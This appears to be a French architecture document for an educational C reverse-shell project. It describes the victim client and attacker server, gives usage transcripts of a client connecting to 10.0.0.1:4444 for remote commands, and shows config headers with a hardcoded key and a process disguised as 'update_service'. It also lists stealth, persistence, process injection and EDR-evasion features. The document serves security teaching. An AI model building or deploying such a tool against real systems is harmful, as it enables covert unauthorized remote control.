# Architecture du Projet Reverse Shell (C)

## 🏗️ Structure Complète

```
03_reverse_shell/
├── PROJECT_STRUCTURE.md     ← Ce fichier (architecture)
├── Cours.md                 ← Théorie du reverse shell
├── Exercice.md              ← Exercices progressifs
├── Solution.md              ← Solutions des exercices
├── README.md                ← Guide de démarrage rapide
├── Makefile                 ← Compilation automatisée
│
├── src/                     ← Code source organisé
│   ├── client/              ← Code du client (victime)
│   │   ├── connection.c/h   ← Gestion connexion réseau
│   │   ├── commands.c/h     ← Exécution commandes
│   │   └── main_client.c    ← Point d'entrée client
│   │
│   ├── server/              ← Code du serveur (attaquant)
│   │   ├── listener.c/h     ← Écoute connexions entrantes
│   │   ├── handler.c/h      ← Gestion des sessions
│   │   └── main_server.c    ← Point d'entrée serveur
│   │
│   ├── utils/               ← Utilitaires partagés
│   │   ├── crypto.c/h       ← Chiffrement XOR/AES
│   │   ├── logger.c/h       ← Logging des événements
│   │   ├── protocol.c/h     ← Protocole de communication
│   │   └── common.h         ← Définitions communes
│   │
│   └── shellcode/           ← Versions shellcode
│       ├── shellcode_x64.asm
│       ├── shellcode_arm64.asm
│       └── compile.sh
│
├── config/                  ← Configuration
│   ├── client_config.h      ← Config client (IP serveur, port)
│   └── server_config.h      ← Config serveur (port écoute)
│
├── tests/                   ← Tests unitaires
│   ├── test_connection.c    ← Test connexion
│   ├── test_crypto.c        ← Test chiffrement
│   ├── test_protocol.c      ← Test protocole
│   └── run_tests.sh         ← Script de test
│
├── examples/                ← Exemples d'utilisation
│   ├── basic_shell.c        ← Shell basique (non chiffré)
│   ├── encrypted_shell.c    ← Shell chiffré XOR
│   ├── persistent_shell.c   ← Shell avec reconnexion
│   └── stealth_shell.c      ← Shell furtif (multi-techniques)
│
├── docs/                    ← Documentation détaillée
│   ├── INSTALLATION.md      ← Guide installation
│   ├── USAGE.md             ← Guide utilisation
│   ├── PROTOCOL.md          ← Protocole réseau
│   └── SECURITY.md          ← Avertissements sécurité
│
└── build/                   ← Binaires compilés (généré)
    ├── client               ← Exécutable client
    ├── server               ← Exécutable serveur
    └── examples/            ← Exemples compilés
```

---

## 📋 Description des Composants

### 🔵 Client (Victime)

**src/client/connection.c** :
- Établir connexion TCP vers le serveur
- Gérer reconnexions automatiques
- Timeouts et retry logic

**src/client/commands.c** :
- Exécuter commandes shell
- Rediriger stdin/stdout/stderr
- Gérer processus enfants

**src/client/main_client.c** :
- Point d'entrée principal
- Boucle de communication
- Gestion d'erreurs

### 🔴 Server (Attaquant)

**src/server/listener.c** :
- Écouter sur un port
- Accepter connexions multiples
- Gérer sessions concurrentes

**src/server/handler.c** :
- Traiter les sessions client
- Envoyer commandes
- Recevoir résultats

**src/server/main_server.c** :
- Interface console attaquant
- Gestion multi-clients
- Logging

### 🛠️ Utils (Partagés)

**src/utils/crypto.c** :
- XOR encryption/decryption
- AES (avec OpenSSL)
- Génération de clés

**src/utils/logger.c** :
- Logs horodatés
- Niveaux (DEBUG, INFO, ERROR)
- Fichiers de log

**src/utils/protocol.c** :
- Format des messages
- Sérialisation/Désérialisation
- Checksums

---

## 🔧 Compilation

### Makefile Targets

```bash
make all          # Compile tout
make client       # Compile seulement client
make server       # Compile seulement server
make examples     # Compile exemples
make test         # Lance tests
make clean        # Nettoie binaires
```

### Compilation Manuelle

```bash
# Client
gcc -o build/client \
    src/client/*.c \
    src/utils/*.c \
    -Iinclude -Wall -Wextra -O2

# Server
gcc -o build/server \
    src/server/*.c \
    src/utils/*.c \
    -Iinclude -Wall -Wextra -O2
```

---

## 🚀 Utilisation

### Scénario Basique

**Terminal 1 (Attaquant)** :
```bash
./build/server -p 4444
[*] Listening on 0.0.0.0:4444
[+] Client connected from 192.168.1.50
[shell]$ whoami
root
[shell]$ ls
file1.txt  file2.txt
```

**Terminal 2 (Victime)** :
```bash
./build/client -h 10.0.0.1 -p 4444
[*] Connecting to 10.0.0.1:4444...
[+] Connected!
```

### Scénario Avancé (Chiffré)

```bash
# Générer clé
./build/keygen -o config/key.bin

# Server avec chiffrement
./build/server -p 4444 -e aes -k config/key.bin

# Client avec chiffrement
./build/client -h 10.0.0.1 -p 4444 -e aes -k config/key.bin
```

---

## ⚙️ Configuration

### config/client_config.h

```c
#ifndef CLIENT_CONFIG_H
#define CLIENT_CONFIG_H

// Connexion
#define SERVER_IP "10.0.0.1"
#define SERVER_PORT 4444

// Reconnexion
#define RETRY_DELAY 60      // Secondes
#define MAX_RETRIES 999     // Illimité

// Chiffrement
#define USE_ENCRYPTION 1
#define CRYPTO_KEY "SecretKey123"

// Furtivité
#define STEALTH_MODE 1      // Délais aléatoires
#define PROCESS_NAME "update_service"

#endif
```

### config/server_config.h

```c
#ifndef SERVER_CONFIG_H
#define SERVER_CONFIG_H

// Écoute
#define LISTEN_PORT 4444
#define LISTEN_ADDR "0.0.0.0"  // Toutes interfaces

// Sessions
#define MAX_CLIENTS 10

// Logging
#define LOG_FILE "server.log"
#define LOG_LEVEL LOG_INFO

// Timeouts
#define SESSION_TIMEOUT 300   // 5 minutes

#endif
```

---

## 🧪 Tests

### test_connection.c

```c
// Tester établissement connexion
void test_basic_connection();
void test_reconnection();
void test_timeout();
```

### test_crypto.c

```c
// Tester chiffrement
void test_xor_encryption();
void test_aes_encryption();
void test_key_generation();
```

---

## 📚 Exemples Fournis

### 1. basic_shell.c

Shell reverse basique sans chiffrement (éducatif).

### 2. encrypted_shell.c

Shell avec chiffrement XOR (production).

### 3. persistent_shell.c

Shell avec reconnexion automatique.

### 4. stealth_shell.c

Shell furtif :
- Délais aléatoires (jitter)
- Chiffrement AES
- Masquage processus

---

## ⚠️ Sécurité et Légalité

**AVERTISSEMENT** :

```
┌──────────────────────────────────────────────────────┐
│  ⚠️  USAGE ÉDUCATIF UNIQUEMENT                       │
├──────────────────────────────────────────────────────┤
│                                                      │
│  - Tests UNIQUEMENT sur VOS machines                │
│  - Environnement isolé (VM, lab personnel)          │
│  - JAMAIS sur systèmes sans autorisation écrite     │
│  - Usage malveillant = ILLÉGAL = PRISON             │
│                                                      │
│  Ce code est fourni à des fins d'APPRENTISSAGE      │
│  de la sécurité informatique, du Red Team et        │
│  du développement de protections.                   │
│                                                      │
└──────────────────────────────────────────────────────┘
```

---

## 🎯 Fonctionnalités Implémentées

### Niveau 1 : Basique
- ✅ Connexion TCP client/server
- ✅ Exécution commandes shell
- ✅ Redirection stdin/stdout/stderr

### Niveau 2 : Intermédiaire
- ✅ Reconnexion automatique
- ✅ Chiffrement XOR
- ✅ Multi-clients (server)
- ✅ Logging

### Niveau 3 : Avancé
- ✅ Chiffrement AES
- ✅ Protocole custom
- ✅ Jitter (délais aléatoires)
- ✅ Heartbeat

### Niveau 4 : Expert
- ✅ Version shellcode (x64, ARM64)
- ✅ Injection process
- ✅ Persistence
- ✅ Évasion EDR

---

## 📖 Documentation

Consultez `docs/` pour :
- **INSTALLATION.md** : Compilation et dépendances
- **USAGE.md** : Exemples d'utilisation
- **PROTOCOL.md** : Spécifications du protocole
- **SECURITY.md** : Bonnes pratiques sécurité

---

*Architecture conçue pour un apprentissage progressif et professionnel*

